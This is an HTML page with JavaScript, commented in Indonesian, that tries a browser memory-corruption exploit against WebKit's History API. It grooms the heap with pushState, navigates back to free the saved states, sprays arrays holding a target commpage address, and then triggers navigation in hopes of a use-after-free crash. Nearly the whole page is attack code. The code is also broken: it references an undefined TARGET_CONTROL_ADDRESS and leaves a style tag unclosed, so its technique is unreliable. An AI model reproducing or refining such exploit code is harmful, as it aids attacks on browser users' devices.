<!DOCTYPE html>
<html>
<head>
    <title>History API State Corruption V3 (Sinkronisasi Maksimal)</title>
</head>
<body>

    <h1>History API State Corruption V3 (FREE/SPRAY Sinkron)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan Serangan History API V3...</p>
    <div id="log-area"></div>

    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
        const TARGET_LENGTH_VALUE = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); // LOW WORD
        const TARGET_CONTROL_ADDRESS_64 = TARGET_CONTROL_ADDRESS; 
        
        const LOW_WORD = TARGET_LENGTH_VALUE;
        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);

        let startTime = performance.now();
        let payloadHolders = []; 
        let historyStates = []; // Menyimpan referensi state

        function log(message, type = 'log-info') {
            const timeElapsed = (performance.now() - startTime).toFixed(2);
            const logElement = document.getElementById('log-area');
            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
            logElement.scrollTop = logElement.scrollHeight;
        }

        // --- FUNGSI HEAP SPRAY PAYLOAD (Mengandung Alamat Commpage 64-bit) ---
        function sprayPayload() {
            log("Memulai Spraying Payload SINKRON...", "log-spray");
            // Menggunakan Float64Array untuk menargetkan pointer 64-bit
            const SPRAY_COUNT = 2000; 
            const PAYLOAD_SIZE = 64; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                // Menempatkan alamat 64-bit di lokasi header pointer
                payloadArray[0] = HIGH_WORD; 
                payloadArray[1] = LOW_WORD;
                payloadArray[2] = 2032.0 + i; 
                payloadHolders.push(payloadArray); 
            }
        }

        // --- FUNGSI UTAMA ATTACK ---
        function runHistoryAttack() {
            startTime = performance.now();
            log("Phase 1: History Grooming (100 States).", "log-init");

            const HISTORY_COUNT = 100;
            const STATE_ARRAY_SIZE = 1024 * 5; 
            
            // 1. Fragmentasi Heap dengan History State
            for (let i = 0; i < HISTORY_COUNT; i++) {
                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
                historyStates.push(stateArray);
            }
            log("Phase 2: Semua State diserialisasi.", "log-info");
            
            // --- KONDISI KRITIS: FREE SINKRON ---
            
            // Memicu Navigasi yang me-free state lama
            window.history.go(-HISTORY_COUNT);
            log("Phase 3: Navigasi ke state paling awal (FREE mulai).", "log-critical");

            // Tepat di tengah proses Navigasi/FREE, lakukan SPRAY SINKRON
            // Kode ini dieksekusi secepat mungkin oleh JS Engine.
            sprayPayload(); 
            log("Phase 4: SPRAY Commpage Payload SINKRON.", "log-critical");

            // Hapus referensi JS setelah spray (memastikan GC melihatnya kosong)
            historyStates = null;
            
            // --- TRIGGER SINKRON ---
            
            // Coba ganti state lagi. Ini memaksa WebKit untuk memproses History API Cache 
            // saat memori mungkin sudah ditimpa.
            window.history.replaceState({ trigger: true }, 'Attack Trigger', '#final');
            log("Phase 5: ReplaceState Trigger Aktif.", "log-critical");
            
            // Trigger Implisit (untuk memicu GC dan Dereference C++)
            setTimeout(() => {
                log("Phase 6: Memicu Navigasi Balik untuk Dereference.", "log-critical");
                
                // Kembali ke state yang baru dibuat (yang mungkin corrupt)
                window.history.go(-1); 
                
                log("Menunggu Crash Implisit (EXC_BAD_ACCESS)...", "log-info");
            }, 100);
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian History API V3...';
            setTimeout(runHistoryAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah FREE/SPRAY Sinkron di History Cache.';
        });
    </script>
    <style>
        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
        .log-init { color: blue; }
        .log-info { color: black; }
        .log-spray { color: purple; }
        .log-critical { color: red; font-weight: bold; }

</body>
